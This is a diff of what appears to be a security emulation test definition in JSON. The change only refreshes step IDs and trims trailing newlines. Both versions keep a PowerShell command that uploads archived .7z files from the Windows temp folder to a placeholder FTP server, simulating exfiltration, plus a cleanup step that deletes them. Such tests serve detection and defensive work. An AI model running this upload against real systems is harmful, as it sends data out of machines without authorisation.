@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "2225ff2f-1708-4430-9972-e51007df5815",
+      "id": "43389400-710b-4d01-aa99-93a391b4db58",
       "type": "execute-command",
       "data": {
-        "command": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://#{ftp_server}/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')\nif (test-connection -count 1 -computername \"#{ftp_server}\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}\n",
+        "command": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://#{ftp_server}/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')\nif (test-connection -count 1 -computername \"#{ftp_server}\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "641cdb17-f132-4263-a193-420be3f80c31",
+      "id": "705549e5-800f-4151-82b5-c2a2fc26a307",
       "type": "execute-command",
       "data": {
-        "command": "$ftp = \"ftp://#{ftp_server}/\"\ntry {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\"))\n{$uri = New-Object System.Uri($ftp+$file.name)\n $ftp_del = [System.Net.FtpWebRequest]::create($uri)\n $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')\n $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile\n $ftp_del.GetResponse()}} catch{}\n",
+        "command": "$ftp = \"ftp://#{ftp_server}/\"\ntry {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\"))\n{$uri = New-Object System.Uri($ftp+$file.name)\n $ftp_del = [System.Net.FtpWebRequest]::create($uri)\n $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')\n $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile\n $ftp_del.GetResponse()}} catch{}",
         "command_type": "powershell"
       },
       "elevation_required": false
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "2225ff2f-1708-4430-9972-e51007df5815",
+      "s": "43389400-710b-4d01-aa99-93a391b4db58",
       "p": "on-success",
-      "o": "641cdb17-f132-4263-a193-420be3f80c31"
+      "o": "705549e5-800f-4151-82b5-c2a2fc26a307"
     },
     {
-      "s": "2225ff2f-1708-4430-9972-e51007df5815",
+      "s": "43389400-710b-4d01-aa99-93a391b4db58",
       "p": "on-failure",
-      "o": "641cdb17-f132-4263-a193-420be3f80c31"
+      "o": "705549e5-800f-4151-82b5-c2a2fc26a307"
     }
   ],
   "tags": [
